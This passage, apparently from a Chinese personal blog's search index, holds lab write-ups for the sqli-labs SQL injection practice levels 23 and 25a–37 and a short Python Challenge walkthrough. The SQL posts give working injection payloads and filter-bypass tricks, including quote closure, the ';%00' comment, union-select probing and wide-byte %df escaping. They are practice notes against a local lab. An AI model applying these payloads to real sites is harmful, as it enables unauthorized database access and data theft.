绕过后其他便可进行正常注入了</code></pre><p>Less -25a</p>
<pre><code>这一关变成数字型注入其他与25关思路完全一致</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less (29-31)</title>
    <url>/2020/07/31/sqli-lab-less-29/</url>
    <content><![CDATA[<p>less -29</p>
<pre><code>这一关的标题就写着   Protection with WAF

我试了半天不管怎么看都和第一关一模一样

不过看后天源码确实有一个hacked.php,可是我怎么测试都没有被拦截</code></pre><a id="more"></a>
<pre><code>于是在网上搜了半天，发现需要安装tomcat。。。。

我又没有安装，在我准备放弃这一题的时候，我又看了一下另一个login.php

只能说作者流批，这个login.php就是为没有安装tomcat的人准备的

如果没装tomca可以直接访问http://127.0.0.1/sqli-labs/Less-29/login.php一样可以达到同样的效果</code></pre><p><img src="/2020/07/31/sqli-lab-less-29/image.png" alt>        </p>
<pre><code>这里采用了双服务器，添加一个参数就可以绕过，剩下的就和之前的操作相同</code></pre><p>——————分割线———————</p>
<p>less -30</p>
<pre><code>这一关与29思路相同

闭合方式从 &apos; 变成  &quot; 即可绕过，其他与之前操作相同</code></pre><p>less -31</p>
<pre><code>闭合方式  &quot;) ，其他与之前思路相同</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less 23</title>
    <url>/2020/07/31/sqli-lab-less-23/</url>
    <content><![CDATA[<p>Less -23</p>
<pre><code>23关从post方式又变成了get方式，又变成了熟悉的界面...

传入一个参数后，回显正常</code></pre><p><img src="/2020/07/31/sqli-lab-less-23/1.png" alt></p>
<a id="more"></a>

<pre><code>进行测试发现直接报错，说明此处存在注入点</code></pre><p><img src="/2020/07/31/sqli-lab-less-23/2.png" alt></p>
<pre><code>可以看到在传入的参数后面有一个单引号，说明这是单引号闭合

进一步确定在后面添加一个注释符</code></pre><p><img src="/2020/07/31/sqli-lab-less-23/3.png" alt></p>
<pre><code>发现还是报错，推测是注释符被过滤，检查源码，发现确实被过滤了。</code></pre><p><img src="/2020/07/31/sqli-lab-less-23/4.png" alt></p>
<pre><code>这里 -- 、# 都被过滤

这里还有一种新的注释方式  &quot; ;%00 &quot; ，通过测试发现确实没有被过滤</code></pre><p><img src="/2020/07/31/sqli-lab-less-23/5.png" alt></p>
<pre><code>解决了注释符的问题剩下的与第一关完全相同。

这里还有一个注释方法，即用and或or语句进行闭合

payload: &apos; and &apos;1&apos;=&apos;1

不过采用这个注释方法order by 无法使用

payload: &apos; order by 1000000 and &apos;1&apos;=&apos;1</code></pre><p><img src="/2020/07/31/sqli-lab-less-23/6.png" alt>    </p>
<pre><code>这里不管数值多大都不会爆出错误，我们已知只有3个表，所以想要查询所存在字段数量只能通过union select 进行一个一个的试

paylaod： -1&apos; union select 1 and &apos;1&apos; =&apos;1

这里我在网上查了很多writeup，找到了这个wirteup

https://www.cnblogs.com/xingyuner/p/12238440.html

这里有对这一种方法的讲解，基本上可以理解为order by

在执行时被忽略了，所以才会一直返回正常。

所以只要用union select 确定字段数后，剩下的与通常方法完全一致</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less (32-33)</title>
    <url>/2020/07/31/sqli-lab-less-32-33/</url>
    <content><![CDATA[<p>Less-32</p>
<pre><code>这一关在进行测试的时候发现hint里，将输入的 &apos; 变成了 \&apos;

随后又输入了 &quot; \ 发现前面都被加了\

很明显宽字节注入在 &apos; 前面加上%df</code></pre><a id="more"></a>
<p><img src="/2020/07/31/sqli-lab-less-32-33/image.png" alt></p>
<pre><code>成功绕过，绕过后其他与之前注入方法相同</code></pre><p>less 33</p>
<pre><code>与32完全一致，不知道是不是我环境的问题。。。</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less (35-37)</title>
    <url>/2020/07/31/sqli-lab-less-35-37/</url>
    <content><![CDATA[<p>less -35</p>
<p>35关数字型注入，没什么好说的，正常注入即可</p>
<p>less -36</p>
<p>get类型宽字节注入，与之前重复</p>
<p>less -37</p>
<p>post类型宽字节注入，与之前重复</p>
<p>吐槽一下，为什么越到后面越简单，我变厉害了（不是</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less 34</title>
    <url>/2020/07/31/sqli-lab-less-34/</url>
    <content><![CDATA[<p>Less-34</p>
<pre><code>这一关由get提交变为post提交，这里还是宽字节注入，不过在登陆框输入%df&apos;后登陆还是失败了</code></pre><p><img src="/2020/07/31/sqli-lab-less-34/1.png" alt></p>
<a id="more"></a>

<pre><code>可以看到hint里，提交的%df还是原样，并没有被服务器解析。

这里是因为输入的%df会被当成特殊符号，会被url编码，所以尽量使用bp抓包进行修改</code></pre><p><img src="/2020/07/31/sqli-lab-less-34/2.png" alt></p>
<pre><code>可以看到成功绕过，绕过之后正常注入即可</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>python challenage</title>
    <url>/2020/08/14/python-challenage/</url>
    <content><![CDATA[<p>今天发现一个非常古老的python编程游戏</p>
<p>一共33关，记录下学习过程，同时检验一下学习成果<br>地址： <a href="http://www.pythonchallenge.com/" target="_blank" rel="noopener">http://www.pythonchallenge.com/</a></p>
<p>第0关</p>
<p><img src="/2020/08/14/python-challenage/0.png" alt></p>
<a id="more"></a>

<p>根据提示，要求更改url的地址，应该是将0改为2^38</p>
<p>非常简单的代码<br>代码：<br>print(2**38)<br>结果：<br>274877906944</p>
<p>第一关</p>
<p><img src="/2020/08/14/python-challenage/1.png" alt></p>
<p>代码：<br>a = “abcdefghijklmnopqrstuvwxyz”<br>b = “cdefghijklmnopqrstuvwxyzab”<br>c = “map”<br>trantab = c.maketrans(a,b)</p>
<p>print(c.translate(trantab))<br>结果：<br>ocr</p>
<p>第二关</p>
<p><img src="/2020/08/14/python-challenage/2.png" alt></p>
<p>提示告诉我们识别这些字符，他们也许在书里，但也许在源代码中</p>
<p><img src="/2020/08/14/python-challenage/2-1.png" alt></p>
<p>发现了一堆字符，很明显要在这堆字符中找到有用的字符，简单的数据清洗<br>代码：<br>import re<br>a = “”//这里将字符串复制过来即可，太长了就不放了<br>b = re.compile(r’[0-9a-zA-Z]’)<br>print(‘’.join(b.findall(a)))<br>结果<br>equality</p>
<p>第三关</p>
<p><img src="/2020/08/14/python-challenage/3.png" alt></p>
<p>一个小写字母周围三个大写字母，和上一关相同，将正则匹配的规则更改即可</p>
<p>import re<br>a = “”//这里将字符串复制过来即可，太长了就不放了<br>b = re.compile(r’[a-z][A-Z]{3}([a-z])[A-Z]{3}[a-z]’<br>print(‘’.join(b.findall(a)))<br>结果<br>linkedlist</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
